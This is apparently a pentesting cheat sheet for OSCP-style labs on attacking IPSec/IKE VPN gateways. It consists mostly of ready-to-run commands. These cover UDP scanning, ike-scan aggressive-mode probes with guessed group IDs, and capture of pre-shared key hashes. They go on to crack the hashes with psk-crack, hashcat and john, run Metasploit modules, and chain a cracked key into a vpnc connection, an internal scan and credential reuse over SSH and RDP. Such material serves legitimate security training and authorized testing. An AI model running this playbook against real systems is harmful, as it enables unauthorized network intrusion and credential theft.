# IPSec / IKE / ISAKMP (UDP 500/4500)

> `<ATTACKER_IP>` = your machine | `<TARGET_IP>` = target | UDP 500 = IKE main/aggressive mode | UDP 4500 = IKE NAT-traversal

---

## Table of Contents

1. [What is IKE/ISAKMP — The Concept](#1-what-is-ikeisakmp--the-concept)
2. [Step 1 — Port Discovery](#2-step-1--port-discovery)
3. [Step 2 — IKE Enumeration with ike-scan](#3-step-2--ike-enumeration-with-ike-scan)
4. [Step 3 — Identifying Transform Sets](#4-step-3--identifying-transform-sets)
5. [Step 4 — Aggressive Mode Exploitation](#5-step-4--aggressive-mode-exploitation)
6. [Step 5 — Hash Capture & Cracking](#6-step-5--hash-capture--cracking)
7. [Step 6 — Metasploit Modules](#7-step-6--metasploit-modules)
8. [Step 7 — Known Vulnerabilities](#8-step-7--known-vulnerabilities)
9. [Chaining Findings](#9-chaining-findings)
10. [Quick Reference Card](#10-quick-reference-card)

---

## 1. What is IKE/ISAKMP — The Concept

**IPSec** = a suite of protocols for encrypting/authenticating IP traffic (used for VPNs).
**IKE (Internet Key Exchange)** = the protocol that negotiates the IPSec session.
**ISAKMP** = the framework IKE uses to negotiate.

```
UDP 500   -> IKE Phase 1 (main mode or aggressive mode)
UDP 4500  -> IKE NAT-Traversal (when a NAT device is between peers)
```

**Why it matters in pentesting:**
- **Aggressive mode** is the dangerous one — it sends the pre-shared key (PSK) hash in cleartext during negotiation, which can be captured and cracked offline
- Misconfigured VPN gateways leak supported cipher/auth info via ike-scan
- Cracked PSK = valid VPN credentials = network access to internal subnets

---

## 2. Step 1 — Port Discovery

```bash
# UDP scan -- MUST use UDP, not TCP
nmap -sU -p 500,4500 <TARGET_IP>

# Version detection
nmap -sU -sV -p 500,4500 <TARGET_IP>

# Full UDP scan including ISAKMP service
nmap -sU -p 500 --script ike-version <TARGET_IP>

# Banner/service check via netcat (UDP)
nc -u <TARGET_IP> 500
```

---

## 3. Step 2 — IKE Enumeration with ike-scan

**ike-scan** is the primary tool — it probes the IKE service and reports back exactly what transform sets (encryption/auth combinations) the peer accepts.

```bash
# Install
sudo apt install ike-scan

# Basic scan -- identify if IKE is running and what it supports
ike-scan <TARGET_IP>

# Scan with specific source port (sometimes needed)
ike-scan --sport 500 <TARGET_IP>

# Main mode scan (default)
ike-scan -M <TARGET_IP>

# Aggressive mode scan -- THIS is the dangerous one
# Aggressive mode sends the PSK hash back in the response
ike-scan --aggressive <TARGET_IP>
ike-scan -A <TARGET_IP>

# Aggressive mode with a specific group/ID name (peer ID required by some configs)
ike-scan -A --id=<GROUP_NAME> <TARGET_IP>
# Common group names to try:
ike-scan -A --id=vpn <TARGET_IP>
ike-scan -A --id=0 <TARGET_IP>
ike-scan -A --id=gateway <TARGET_IP>
ike-scan -A --id=cisco <TARGET_IP>

# Specify source IP
ike-scan --sourceip=<ATTACKER_IP> <TARGET_IP>

# Use UDP 4500 (NAT-T)
ike-scan --dport=4500 --sport=4500 <TARGET_IP>
```

**Reading ike-scan output:**
```
<TARGET_IP>  Main Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024 LifeType=Seconds LifeDuration=28800)
```
- `Enc=3DES` — encryption algorithm
- `Hash=SHA1` — hashing algorithm
- `Auth=PSK` — **pre-shared key authentication** → crackable if aggressive mode
- `Group=2` — Diffie-Hellman group

---

## 4. Step 3 — Identifying Transform Sets

Transform sets define which encryption/auth combinations are accepted. ike-scan can brute-force all supported combinations:

```bash
# Use ike-scan's built-in transform enumeration
ike-scan -M --trans=5,2,1,2 <TARGET_IP>   # 3DES, SHA1, PSK, DH Group 2

# Automated transform set brute force with ikescan
# Use the bundled script that tries all combinations
./ike-scan-trans.sh <TARGET_IP>

# Common transforms to try manually:
# Format: Enc,Hash,Auth,Group
# 1,1,1,1 = DES, MD5, PSK, DH1
# 5,2,1,2 = 3DES, SHA1, PSK, DH2
# 7,2,1,2 = AES128, SHA1, PSK, DH2
# 7,2,1,5 = AES128, SHA1, PSK, DH5

ike-scan -M --trans=1,1,1,1 <TARGET_IP>
ike-scan -M --trans=5,2,1,2 <TARGET_IP>
ike-scan -M --trans=7,2,1,2 <TARGET_IP>

# ikeforce -- automates transform brute force + aggressive mode PSK capture
git clone https://github.com/SpiderLabs/ikeforce.git
cd ikeforce
pip2 install pyip
python ikeforce.py <TARGET_IP> -e -t 5 2 1 2
```

---

## 5. Step 4 — Aggressive Mode Exploitation

When aggressive mode is enabled and `Auth=PSK`, the hash is sent back to YOU — capture it for offline cracking.

```bash
# Trigger aggressive mode and capture the hash
ike-scan -A <TARGET_IP> -P captured_hash.txt

# With specific group ID (try common names)
ike-scan -A --id=vpn <TARGET_IP> -P vpn_hash.txt
ike-scan -A --id=cisco <TARGET_IP> -P cisco_hash.txt
ike-scan -A --id=0 <TARGET_IP> -P hash_0.txt

# ikeforce -- automates ID enumeration + hash capture
python ikeforce.py <TARGET_IP> -e -w /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt

# psk-crack -- dedicated IKE PSK cracker (from ike-scan package)
psk-crack captured_hash.txt
psk-crack --dictionary /usr/share/wordlists/rockyou.txt captured_hash.txt
psk-crack --bruteforce 8 captured_hash.txt   # brute force up to 8 chars
```

---

## 6. Step 5 — Hash Capture & Cracking

```bash
# psk-crack (bundled with ike-scan -- fastest for PSK hashes)
psk-crack --dictionary /usr/share/wordlists/rockyou.txt hash.txt
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

# john the ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# hashcat -- IKE PSK hashes use mode 5300 (IKE-PSK MD5) or 5400 (IKE-PSK SHA1)
hashcat -m 5300 hash.txt /usr/share/wordlists/rockyou.txt   # MD5-based
hashcat -m 5400 hash.txt /usr/share/wordlists/rockyou.txt   # SHA1-based

# Show cracked
hashcat -m 5300 hash.txt --show
```

---

## 7. Step 6 — Metasploit Modules

```bash
msfconsole

# IKE/ISAKMP version scanner
use auxiliary/scanner/ike/ike_scan
set RHOSTS <TARGET_IP>
run

# IKE aggressive mode PSK hash capture
use auxiliary/scanner/ike/ike_aggressive_psk
set RHOSTS <TARGET_IP>
set GROUPNAME vpn
run

# Search for all IKE-related modules
search ike
search isakmp
search ipsec
```

---

## 8. Step 7 — Known Vulnerabilities

```bash
# Always check the exact VPN software/version after enumeration
# ike-scan -M often reveals vendor info in the response

searchsploit ike
searchsploit isakmp
searchsploit ipsec
searchsploit cisco vpn
searchsploit checkpoint vpn
searchsploit fortinet vpn

# Common historically-vulnerable implementations:
# Cisco VPN concentrators -- various info disclosure / DoS
# Checkpoint VPN -- multiple historic issues
# CVE-2002-1623 -- IKE/ISAKMP info disclosure (very old, but appears in legacy labs)
```

---

## 9. Chaining Findings

```bash
# Cracked PSK -> connect to VPN -> access internal network
# Use vpnc or openconnect depending on vendor:

# Cisco VPN (vpnc)
sudo apt install vpnc
cat > /etc/vpnc/target.conf << EOF
IPSec gateway <TARGET_IP>
IPSec ID vpn
IPSec secret <CRACKED_PSK>
Xauth username admin
EOF
sudo vpnc target

# Once VPN is connected -- enumerate internal network as normal
nmap -sV <INTERNAL_SUBNET>/24

# Found credentials to try elsewhere
ssh admin@<TARGET_IP>
xfreerdp /v:<TARGET_IP> /u:admin /p:<CRACKED_PSK> /cert:ignore
```

---

## 10. Quick Reference Card

```
====================================================================
 IPSEC / IKE / ISAKMP (UDP 500/4500) — OSCP QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = target
====================================================================

[DISCOVERY]
  nmap -sU -p 500,4500 <TARGET_IP>
  nmap -sU -p 500 --script ike-version <TARGET_IP>

[BASIC ENUMERATION]
  ike-scan <TARGET_IP>                     <- main mode, get transforms
  ike-scan -M <TARGET_IP>                   <- multiline output, cleaner
  ike-scan -A <TARGET_IP>                   <- aggressive mode test

[AGGRESSIVE MODE + HASH CAPTURE]
  ike-scan -A <TARGET_IP> -P hash.txt
  ike-scan -A --id=vpn <TARGET_IP> -P hash.txt
  ike-scan -A --id=cisco <TARGET_IP> -P hash.txt
  ike-scan -A --id=0 <TARGET_IP> -P hash.txt
  # (try multiple group IDs -- different ones trigger different responses)

[TRANSFORM BRUTE FORCE]
  python ikeforce.py <TARGET_IP> -e -t 5 2 1 2

[CRACK THE PSK HASH]
  psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
  hashcat -m 5300 hash.txt rockyou.txt      <- MD5-based
  hashcat -m 5400 hash.txt rockyou.txt      <- SHA1-based
  john hash.txt --wordlist=rockyou.txt

[METASPLOIT]
  use auxiliary/scanner/ike/ike_aggressive_psk
  set RHOSTS <TARGET_IP>
  set GROUPNAME vpn
  run

[USE CRACKED PSK]
  sudo vpnc (cisco) -> connect -> enumerate internal /24

[KEY TAKEAWAY]
  Aggressive mode + PSK auth = hash handed to you free.
  ike-scan -A --id=<groupname> captures it.
  psk-crack or hashcat -m 5300/5400 cracks it.
  Cracked PSK = VPN access = internal network entry.
====================================================================
```

---

*Authorized pentesting / OSCP lab use only.*
